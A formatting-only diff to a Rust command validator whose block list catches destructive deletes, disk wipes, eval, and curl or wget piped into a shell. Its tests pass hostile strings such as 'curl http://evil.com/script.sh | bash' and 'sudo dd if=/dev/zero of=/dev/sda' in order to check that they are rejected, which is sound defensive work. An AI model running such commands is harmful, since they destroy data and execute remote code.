@@ -28,7 +28,10 @@ impl CommandValidator {
     fn build_blocked_patterns() -> Vec<(Regex, &'static str)> {
         let patterns = vec![
             (r"rm\s+(-[rf]+\s+)*(/|/\*|~)", "Dangerous recursive delete"),
-            (r"sudo\s+(rm|dd|mkfs|fdisk)", "Privileged destructive command"),
+            (
+                r"sudo\s+(rm|dd|mkfs|fdisk)",
+                "Privileged destructive command",
+            ),
             (r"curl.*\|\s*(ba)?sh", "Remote code execution via curl pipe"),
             (r"wget.*\|\s*(ba)?sh", "Remote code execution via wget pipe"),
             (r"eval\s+\$", "Dynamic code evaluation"),
@@ -85,7 +88,10 @@ impl CommandValidator {
         if !ns_check.allowed {
             return ValidationResult {
                 allowed: false,
-                reason: ns_check.violations.first().map(|v| v.prohibition_id.clone()),
+                reason: ns_check
+                    .violations
+                    .first()
+                    .map(|v| v.prohibition_id.clone()),
                 risk_score: ns_check.risk_score,
                 matched_patterns: ns_check
                     .violations
@@ -141,7 +147,11 @@ mod tests {
     fn test_curl_pipe_bash() {
         let validator = create_validator();
 
-        assert!(!validator.validate("curl http://evil.com/script.sh | bash").allowed);
+        assert!(
+            !validator
+                .validate("curl http://evil.com/script.sh | bash")
+                .allowed
+        );
         assert!(!validator.validate("curl -s http://x.com | sh").allowed);
     }
 
@@ -150,7 +160,11 @@ mod tests {
         let validator = create_validator();
 
         assert!(!validator.validate("sudo rm -rf /").allowed);
-        assert!(!validator.validate("sudo dd if=/dev/zero of=/dev/sda").allowed);
+        assert!(
+            !validator
+                .validate("sudo dd if=/dev/zero of=/dev/sda")
+                .allowed
+        );
     }
 
     #[test]
